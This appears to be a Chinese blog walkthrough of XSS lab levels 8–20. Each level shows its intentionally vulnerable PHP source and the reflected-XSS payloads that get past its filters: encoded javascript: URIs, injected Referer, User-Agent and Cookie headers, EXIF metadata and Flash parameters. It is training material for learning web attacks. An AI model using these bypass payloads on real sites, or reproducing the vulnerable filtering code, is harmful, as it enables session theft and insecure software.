<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在上面基础上添加了大小写过滤、属性中双引号被转换成HTML实体，无法截断属性，可以使用协议绕过javascript:alert，由于script关键字被过滤，</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level8.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">在线实体编码</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//实体编码，javascript会被替换成javasc_rpt，我们使用&amp;#x72来代替r ,HTML字符实体转换：</span><br><span class="line">`javascrip&amp;#x74;:alert(1)`</span><br><span class="line">`javascript:%61lert(1)`</span><br><span class="line">`javasc&amp;#x72;ipt:alert`1``</span><br><span class="line">`javasc&amp;#x0072;ipt:alert`1``</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828154518631.png" alt="image-20200828154518631"></p>
<h5 id="挑战九"><a href="#挑战九" class="headerlink" title="挑战九"></a>挑战九</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//实体编码测试</span><br><span class="line">`javascrip&amp;#x74;:alert(1)`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828154756855.png" alt="image-20200828154756855"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在之前基础上，添加的链接是http:&#x2F;&#x2F;头信息</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//添加http://信息</span><br><span class="line">`javascrip&amp;#x74;:alert(1)//http://xxx.com ` //利用注释</span><br><span class="line">`javascrip&amp;#x74;:%0dhttp://xxx.com%0dalert(1) ` //不利用注释</span><br><span class="line">`javascrip&amp;#x74;:%0ahttp://xxx.com%0daalert(1)`  //不利用注释</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828155322234.png" alt="image-20200828155322234"></p>
<h5 id="挑战十"><a href="#挑战十" class="headerlink" title="挑战十"></a>挑战十</h5><p>发现一个隐藏输入框</p>
<p><img src="/images/XSS/image-20200828155806918.png" alt="image-20200828155806918"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;多了个参数、多了一个输入框且已经隐藏、并对&lt;、&gt;括号进行过滤，htmlspecialchars函数过滤</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form id&#x3D;search&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//添加参数并构造PoC</span><br><span class="line">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1)`</span><br><span class="line">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1)`</span><br><span class="line">`keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1``</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828160245970.png" alt="image-20200828160245970"></p>
<h5 id="挑战十一"><a href="#挑战十一" class="headerlink" title="挑战十一"></a>挑战十一</h5><p>之前测试发现无效果，查看源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比之前多了个请求头REFERER进行指定来源</span></span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//修改请求头并修改一下PoC代码</span><br><span class="line">`Referer: &quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class="line">`Referer: &quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828161500548.png" alt="image-20200828161500548"></p>
<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828161534239.png" alt="image-20200828161534239"></p>
<h5 id="挑战十二"><a href="#挑战十二" class="headerlink" title="挑战十二"></a>挑战十二</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不再是REFERER请求头，现在更换了User-agent</span></span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//修改User-agent插入PoC</span><br><span class="line">`User-Agent: &quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class="line">`User-Agent: &quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828162042253.png" alt="image-20200828162042253"></p>
<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828162112961.png" alt="image-20200828162112961"></p>
<h5 id="挑战十三"><a href="#挑战十三" class="headerlink" title="挑战十三"></a>挑战十三</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;修改请求头Cookie来测试</span><br><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11&#x3D;$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form id&#x3D;search&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_cook&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//修改Cookie</span><br><span class="line">`Cookie: user=call+me+maybe%3F&quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class="line">`Cookie: user=call+me+maybe%3F&quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200828162907084.png" alt="image-20200828162907084"></p>
<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828162927276.png" alt="image-20200828162927276"></p>
<h5 id="挑战十四"><a href="#挑战十四" class="headerlink" title="挑战十四"></a>挑战十四</h5><p>网路搜索：</p>
<p><code>此题主要利用exif xss，链接由于网络的原因无法访问，exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，可利用exiftool工具，命令如下：</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//但是因为域名无法访问了，这题后期再更</span><br><span class="line">`exiftool -FIELD=XSS FILENAME`</span><br><span class="line">`exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; filename.jpeg`</span><br></pre></td></tr></table></figure>

<h5 id="挑战十五"><a href="#挑战十五" class="headerlink" title="挑战十五"></a>挑战十五</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ng-include是AngularJS中指令，具有文件包含功能&quot;&lt;div ng-include&#x3D;&quot;&#39;myFile.htm&#39;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&quot;，和php中include函数类似。可通过src属性来加载以上是挑战任意一个。</span><br><span class="line">&#x2F;&#x2F;这里需要注意，其中远程加载google的js，需要&quot;扶梯子&quot;才行。</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;src&quot;];</span><br><span class="line">echo &#39;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//这里包含挑战二来实现XSS</span><br><span class="line">`/level15.php?src=&#x27;level2.php?keyword=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&#x27;`</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828200852458.png" alt="image-20200828200852458"></p>
<h5 id="挑战十六"><a href="#挑战十六" class="headerlink" title="挑战十六"></a>挑战十六</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对变量的值进行script、&#x2F;、空格等替换&amp;nbsp，用%0d，%0a等绕过</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level16.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对字符进行编码</span><br><span class="line">`&lt;img%0dsrc=1%0donerror=alert(16)&gt;`</span><br><span class="line">`&lt;iframe%0dsrc=0%0donmouseover=alert｀16｀&gt;&lt;/iframe&gt;`</span><br><span class="line">`&lt;svg%0aonload=alert｀16｀&gt;&lt;/svg&gt;`</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828203522683.png" alt="image-20200828203522683"></p>
<h5 id="挑战十七"><a href="#挑战十七" class="headerlink" title="挑战十七"></a>挑战十七</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;加载swf文件，并对两个参数arg01和arg02值进行过滤</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src&#x3D;xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//使用编码%0a、%0b绕过。</span><br><span class="line">`arg01=123&amp;arg02= onmouseover=alert(1)`</span><br><span class="line">`arg01=123&amp;arg02=%20onmousedown=alert`1``</span><br><span class="line">`arg01=123&amp;arg02=  onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class="line">``/level17.php?arg01=a&amp;arg02=%20onmouseover=alert`1``</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200828220707491.png" alt="image-20200828220707491"></p>
<h5 id="挑战十八"><a href="#挑战十八" class="headerlink" title="挑战十八"></a>挑战十八</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;和挑战十七的试题一致，可直接拿来利用测试</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src&#x3D;xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//使用编码%0a、%0b绕过。</span><br><span class="line">`arg01=123&amp;arg02= onmouseover=alert(1)`</span><br><span class="line">`arg01=123&amp;arg02=%20onmousedown=alert`1``</span><br><span class="line">`arg01=123&amp;arg02=  onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class="line">`/level17.php?arg01=a&amp;arg02=%20onmouseover=alert`1``</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200829095926257.png" alt="image-20200829095926257"></p>
<h5 id="挑战十九"><a href="#挑战十九" class="headerlink" title="挑战十九"></a>挑战十九</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;此题主要介绍考察Flash XSS</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#39;&lt;embed src&#x3D;&quot;xsf03.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接访问URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xss-lab.me:8888&#x2F;level19.php?arg01&#x3D;a&amp;arg02&#x3D;b</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200829104903728.png" alt="image-20200829104903728"></p>
<p>swf文件直接输出参数值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用a标签加载javascript协议弹窗</span><br><span class="line">`/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;XSS_Click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/image-20200829105426617.png" alt="image-20200829105426617"></p>
<p>点击触发漏洞</p>
<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200829105522767.png" alt="image-20200829105522767"></p>
<h5 id="挑战二十"><a href="#挑战二十" class="headerlink" title="挑战二十"></a>挑战二十</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;网络搜索未找到对应解析此题，只知道此题还是Flash XSS。</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#39;&lt;embed src&#x3D;&quot;xsf04.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用以下payload可实现，备注参数arg01的值必须是id不然都不弹窗；不理解其意；</span><br><span class="line">`level20.php?arg01=id&amp;arg02=\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height`</span><br></pre></td></tr></table></figure>

<p><code>Result</code></p>
<p><img src="/images/XSS/image-20200829135137358.png" alt="image-20200829135137358"></p>
<p>参考以上学习可简单了解XSS反射型，但如想继续研究建议可网络搜索在线挑战并练习或参考网上Writeup。</p>
